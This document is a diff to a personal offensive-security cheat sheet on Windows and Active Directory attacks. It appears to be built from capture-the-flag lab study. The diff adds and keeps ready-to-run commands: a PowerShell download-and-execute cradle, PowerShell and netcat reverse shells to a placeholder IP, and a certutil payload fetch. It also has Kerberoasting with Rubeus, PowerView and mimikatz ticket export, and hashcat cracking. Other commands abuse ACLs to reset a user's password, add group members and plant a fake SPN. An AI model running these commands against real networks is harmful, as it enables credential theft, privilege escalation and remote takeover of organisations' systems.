@@ -150,7 +150,7 @@ https://www.exploit-db.com/
 
 # Hashcat
 tag: Misc
-https://hashcat.net/wiki/doku.php?id=example_hashes 
+[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 ```zsh
 $ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt
 $ hashcat -m 5600 TestUser_ntlmv2 /usr/share/wordlists/rockyou.txt
@@ -355,13 +355,38 @@ PS> Get-LAPSComputers
 # one line
 PS> powershell -nop -c "powershell command; powershell command...;"
 PS> powershell -command "Start-Process -Verb runas cmd"
+# basic
+PS> hostname
+PS> [System.Environment]::OSVersion.Version
+PS> wmic qfe get Caption,Description,HotFixID,InstalledOn
+PS> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumb
+PS> ipconfig /all
+PS> systeminfo
+command prompt> set
+command prompt> echo %USERDOMAIN%
+command prompt> echo %logonserver%
+PS> Get-Module
+PS> Get-ExecutionPolicy -List
+PS> Set-ExecutionPolicy Bypass -Scope Process
+PS> Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+PS> Get-ChildItem Env: | ft Key,Value
+# stealth
+PS> Get-host
+PS> powershell.exe -version 2
+PS> Get-host
+PS> get-module
 # check user
 PS> whoami /user
 PS> whoami /priv
+# check loggedon
+PS> qwinsta
 # check OS
 PS> wmic os list brief
-# check Windows Version
-PS> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumbe
+# check Network
+PS> arp -a
+PS> ipconfig /all
+PS> route print
+PS> netsh advfirewall show state
 # check alias
 PS> get-alias | sls "*ipconfig*"
 PS> Get-Alias | select -First 2
@@ -370,7 +395,10 @@ PS> Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
 PS> tree c:\
 PS> tree c:\ /f | more
 PS> tree c:\ /f | Select-String "TestString" -context 20, 10
+# firewall check
+PS> netsh advfirewall show allprofiles
 # Enumerating Security Controls
+PS> sc.exe query windefend
 PS> Get-MpComputerStatus
 PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 PS> $ExecutionContext.SessionState.LanguageMode
@@ -379,12 +407,16 @@ PS> $username = 'TestAdminUser'
 PS> $password = 'TestAdminPassword'
 PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS> $SecPassword = ConvertTo-SecureString 'TestNewPassword' -AsPlainText -Force
+PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
 # access
 PS> New-PSSession -ComputerName TestHost.HOGE.com
 PS> Enter-PSSession -ComputerName TestHost.HOGE.com
 PS> Enter-PSSession -Computername TARGET -Credential $credential
 ## or
 PS> Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+# download
+PS> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
 # Reverse Shell
 PS> $client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX',RPORT);
 PS> $stream = $client.GetStream()
@@ -443,6 +475,9 @@ PS> New-LocalUser -Name $username -Password $password -FullName 'Test' -Descript
 PS> $groupName = 'TestNewGroup'
 PS> New-LocalGroup -Name $groupName -Description 'Description of the new group'
 PS> Add-LocalGroupMember -Group $groupName -Member 'TestUser'
+# load credential to memory
+PS> Add-Type -AssemblyName System.IdentityModel
+PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TestSvc/TestHost.hoge. local:1433"
 # Shell
 PS> $username = 'TestUser'
 PS> $password = 'TestPassword'
@@ -458,7 +493,7 @@ PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 PS> runas /netonly /user:HOGE.com\TestUser cmd.exe
 PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 4443"
 ```
-## Import-Module ActiveDirectory
+## Module: ActiveDirectory
 ```powershell
 PS> Get-Module
 PS> Import-Module ActiveDirectory
@@ -469,11 +504,16 @@ PS> Get-ADDomain
 PS> Get-ADUser -Identity TestUser -Properties *
 PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+PS> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
 # Group
 PS> Get-ADGroup -Filter * | select name
 PS> Get-ADGroup -Identity "Backup Operators"
 PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
+PS> Get-ADGroup -Identity "Test Group" -Properties * | Select -ExpandProperty Members
 PS> Get-ADGroupMember -Identity "Backup Operators"
+PS> $SecPassword = ConvertTo-SecureString 'TestPassword' -AsPlainText -Force
+PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $SecPassword)
+PS> Add-DomainGroupMember -Identity 'Test Group' -Members 'TargetUser' -Credential $Cred -Verbose
 # Change Password
 PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
 PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
@@ -482,36 +522,90 @@ PS> $ChangeDate = New-Object DateTime(2024, 01, 24, 12, 00, 00)
 PS> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server HOGE.com
 # Trust
 PS> Get-ADTrust -Filter *
+# ACE
+PS> $guid= "00299570-246d-11d0-a768-00aa006e0529"
+PS> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+PS> foreach($line in [System.IO.File]::ReadLines("C:\Users\TestUser\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'HOGE\\TargetUser'}}
 ```
-
 ## sc.exe
 ```powershell
 PS> sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
 ```
-
 ## certutil.exe
 ```powershell
 PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
 ```
-
+## WMI
+- https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4  
+- https://learn.microsoft.com/en-us/windows/win32/wmisdk/using-wmi
+```powershell
+PS> wmic qfe get Caption,Description,HotFixID,InstalledOn
+PS> wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+PS> wmic process list /format:list
+PS> wmic ntdomain list /format:list
+PS> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+PS> wmic useraccount list /format:list
+PS> wmic group list /format:list
+PS> wmic sysaccount list /format:list
+```
 ## net.exe
 ```zsh
+$ net accounts
+$ net accounts /domain
+$ net group /domain
+$ net group "Domain Admins" /domain
+$ net group "Domain Controllers" /domain
+$ net group "TestGroup" /domain
+$ net groups /domain
+$ net localgroup
+$ net localgroup administrators /domain
+$ net localgroup Administrators
+$ net localgroup administrators TestUser /add
+$ net share
+$ net user TestUser /domain
+$ net user /domain TestUser
+$ net user /domain
+$ net user %username%
+$ net use x: \computer\share
+$ net view
+$ net view /all /domain:hoge.local
+$ net view \computer /ALL
+$ net view /domain
 $ net use \\DC01\ipc$ "" /u:""
 $ net use \\DC01\ipc$ "" /u:TestUser
 $ net use \\DC01\ipc$ "TestPassword" /u:TestUser
-$ net user %username%
-$ net user /domain
-$ net user TestUser /domain
-$ net group /domain
-$ net group "TestGroup" /domain
-$ net accounts
-$ net accounts /domain
+# userful for bypassing string restriction
+$ net1 user
 ```
-
+## Dsquery  
+- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)
+- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
+- [User Account Control (UAC) attributes](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
+- [LDAP OID Reference Guide](https://ldap.com/ldap-oid-reference-guide/)
+- [OID: 1.2.840.113556.1.4.803](https://learn.microsoft.com/ja-jp/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5)
+- [Search Filter Syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax)
+```powershell
+PS> dsquery user
+PS> dsquery computer
+PS> dsquery * "CN=Users,DC=HOGE,DC=LOCAL"
+PS> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
+PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
+PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
+PS> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+```
 ## WinRM
 tag: remote access
 ```powershell
 PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
+```
+## setspn
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
+https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
+```powershell
+PS> setspn.exe -Q */*
+PS> setspn.exe -Q vmware/HOGE.clocal
+PS> setspn.exe -T HOGE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
 # PowerView  
@@ -523,18 +617,39 @@ PS> Get-DomainPolicy
 PS> Get-DomainUser -Identity TestUser -Domain hoge.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+PS> Get-DomainUser * -spn | select samaccountname
+PS> Get-DomainUser -Identity TestUser | Get-DomainSPNTicket -Format Hashcat
+PS> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\hoge_tgs.csv -NoTypeInformation
+PS> Get-DomainUser TestSpn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+PS> $sid = Convert-NameToSid TestUser
 # Group
 PS> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+PS> Get-DomainGroupMember -Identity "Test Group" | Select MemberName
+PS> Get-DomainGroupMember -Identity "Test Group" | Select MemberName |? {$_.MemberName -eq 'TestUser'} -Verbose
 PS> Get-DomainGroup -Identity "TestGroup" | select memberof
+## clear
+PS> Remove-DomainGroupMember -Identity "Test Group" -Members 'TestUser' -Credential $Cred -Verbose
 # ACL
 PS> Find-InterestingDomainAcl
 PS> $TestUserSid = Convert-NameToSid TestUser
+PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid}
 PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid} -Verbose
 PS> $TestGroupSid = Convert-NameToSid "TestGroup"
 PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $TestGroupSid}
 # Trust
 PS> Get-DomainTrustMapping
 PS> Test-AdminAccess -ComputerName TestHostDC
+# Change Password
+PS> $TestUserSecPassword = ConvertTo-SecureString 'TestUserPassword' -AsPlainText -Force
+PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $TestUserSecPassword)
+PS> $TargetUserSecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+PS>Set-DomainUserPassword -Identity TargetUser -AccountPassword $TargetUserSecPassword -Credential $Cred -Verbose
+# Create Fake SPN
+PS> $TestUserSecPassword = ConvertTo-SecureString 'TestUserPassword' -AsPlainText -Force
+PS> $Cred = New-Object System.Management.Automation.PSCredential('HOGE\TestUser', $TestUserSecPassword)
+PS> Set-DomainObject -Credential $Cred -Identity TargetUser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+## clear
+PS> Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose
 ```
 
 # SharpView
@@ -542,6 +657,9 @@ PS> Test-AdminAccess -ComputerName TestHostDC
 PS> .\SharpView.exe Get-DomainUser -Help
 PS> .\SharpView.exe Get-DomainUser -Identity TestUser
 ```
+
+# targetedKerberoast
+https://github.com/ShutdownRepo/targetedKerberoast
 
 # Metasploit
 ```zsh
@@ -634,13 +752,7 @@ https://github.com/SnaffCon/Snaffler
 ```powershell
 PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
 ```
-# Dsquery  
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)  
-```powershell
-PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
-PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
-PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
-```
+
 
 # Samba
 ## smbclient
@@ -669,13 +781,6 @@ $ echo $((16#ff0))
 $ for u in $(cat valid_users.txt);do rpcclient -U "$u%TestPassword" -c "getusername;quit" 172.16.0.10 | grep Authority; done
 ```
 
-# setspn
-https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
-```powershell
-PS> setspn.exe -Q */*
-PS> setspn.exe -Q vmware/HOGE.com
-```
-
 ## targeting single user
 ```powershell
 PS> Add-Type -AssemblyName System.IdentityModel
@@ -683,12 +788,18 @@ PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argum
 PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
 ```
 
+# pth-tookit
+https://github.com/byt3bl33d3r/pth-toolkit
+
 # mimikatz
 ```zsh
 PS> mimikatz.exe
 mimikatz # privilege::debug
 mimikatz# base64 /out:true
 mimikatz# kerberos::list /export
+## linux
+# $ echo "<base64 TestUser>" |  tr -d \\n
+# $ cat encoded_file | base64 -d > TestUser.kirbi
 mimikatz# kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
 mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
 tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
@@ -700,11 +811,16 @@ mimikatz# misc::skelton
 ```
 
 # Rebeus
+https://github.com/GhostPack/Rubeus
+[msDS-SupportedEncryptionTypes](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797)
 ```powershell
 PS> Rubeus.exe harvest /interval:30
 PS> echo XXX.XXX.XXX.XXX HOGE.com >> C:\Windows\System32\drivers\etc\hosts
 PS> Rubeus.exe brute /password:Password1 /noticket
+PS> Rubeus.exe kerberoast /stats
 PS> Rubeus.exe kerberoast /outfile:hashes.txt
+PS> Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+PS> Rubeus.exe kerberoast /user:testspn /nowrap
 PS> Rubeus.exe asreproast
 ```
 ```zsh
@@ -719,6 +835,11 @@ $ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t' | sed 's/\$krb5asrep/\
 $ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t' | sed 's/\$krb5asrep/\$krb5asrep\$23/' > ./Rubeus_asreproast_TestUser_hash_edit.txt
 $ cat Rubeus_asreproast_TestUserhash_edit.txt
 $ hashcat -m 18200 ./Rubeus_asreproast_TestUser_hash_edit.txt Pass.txt
+```
+
+# kirbi2john.py
+```zsh
+$ python2.7 kirbi2john.py TestUser.kirbi
 ```
 
 # DCSync
@@ -785,12 +906,13 @@ $ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./
 ```
 ## GetUserSPNs.py
 ```zsh
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo -request
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
-$ GetUserSPNs.py HOGE.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -request -outputfile GetUserSPNs-py_hashcat.txt
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo -request
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo –request-user TestUser
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo –request-user TestUser -outputfile TestUser_tgs
+$ GetUserSPNs.py HOGE.local/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -request -outputfile GetUserSPNs-py_hashcat.txt
 # -> Hashcat
+##$ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt 
 ```
 ## ntlmrelayx.py
 ```zsh
@@ -907,6 +1029,24 @@ PS> Get-Content .\cert_templates.txt -Raw `
 | Select-String -Pattern "Template\[.*?\].*?(CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
 | Select-String -Pattern "Template\[.*?\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
 | Foreach-Object {$_ -replace "aaaa", "`n"}
+```
+```zsh
+PS> setspn.exe -Q */*
+PS> Add-Type -AssemblyName System.IdentityModel
+PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TestSvc/TestHost.hoge.local:1433"
+PS> setspn.exe -T HOGE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+PS> .\mimikatz.exe
+mimikatz # base64 /out:true
+mimikatz # kerberos::list /export
+$ echo "<base64 TestUser>" |  tr -d \\n
+$ cat encoded_file | base64 -d > TestUser.kirbi
+$ python2.7 kirbi2john.py TestUser.kirbi
+$ ls
+crack_file
+$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > TestUser_tgs_hashcat
+$ cat TestUser_tgs_hashcat
+$krb5tgs$23$*TestUser.kirbi*$aaaa....$bbbb....
+$ hashcat -m 13100 TestUser_tgs_hashcat /usr/share/wordlists/rockyou.txt 
 ```
 
 # config
